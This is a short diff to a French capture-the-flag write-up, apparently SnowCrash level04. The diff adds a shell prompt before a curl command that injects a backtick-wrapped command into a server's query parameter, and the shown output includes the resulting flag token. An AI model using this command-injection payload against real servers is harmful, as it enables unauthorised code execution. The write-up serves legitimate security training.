@@ -31,6 +31,6 @@ on voit bien que le serveur fait juste un echo sur la variable x
 on fait alors une injection shell :
 
 ```
-curl '10.0.2.15:4747?x=`getflag`'
+level04@SnowCrash:~$ curl '10.0.2.15:4747?x=`getflag`'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
